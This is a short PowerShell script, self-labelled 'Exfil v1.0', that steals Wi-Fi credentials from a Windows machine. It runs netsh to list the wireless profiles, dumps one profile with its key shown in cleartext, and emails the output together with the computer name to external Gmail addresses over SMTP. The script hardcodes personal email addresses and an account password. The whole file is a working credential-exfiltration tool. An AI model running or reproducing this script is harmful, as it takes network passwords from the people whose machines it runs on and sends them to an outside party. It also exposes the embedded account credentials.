


Function Send-NetInfo
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$subject,
        [string]$msgbody
    )
    $email = "radicaltronic@gmail.com"
    $recipients = "radicaltronic@gmail.com,guillaumeplante.qc@gmail.com"
    $pass = "SecretTEst23_"

    $EmailFrom = "radicaltronic@gmail.com"
    $EmailTo = "radicaltronic@gmail.com,guillaumeplante.qc@gmail.com"
    $Subject = $subject
    $Body = $msgbody
    $SMTPServer = "smtp.gmail.com"
    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($email, $pass);
    $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
}



function Log($msg)
{
    Write-Host "[LOG] " -f DarkYellow -NoNewLine
    Write-Host "$msg" -f Red
}

Log "Exfil v1.0"
$wifi_network_name=""
$NetProfiles=(netsh wlan show profiles)
$NetProfiles | Select-String "\:(.+)$" | %{$wifi_network_name=$_.Matches.Groups[1].Value.Trim(); $_} 


if($wifi_network_name -ne "")
{
    "Wifi network name: $wifi_network_name"
    $extended_info=%{(netsh wlan show profile name="$wifi_network_name" key=clear)} 
    %{(netsh wlan show profile name="$wifi_network_name" key=clear)} 

}else{
    "Could not detect Wifi network name"
}


$EmailMessageBody = "NETWORK INFO: $NetProfiles $extended_info"

Send-NetInfo "$env:COMPUTERNAME : Network Profile Info" $EmailMessageBody 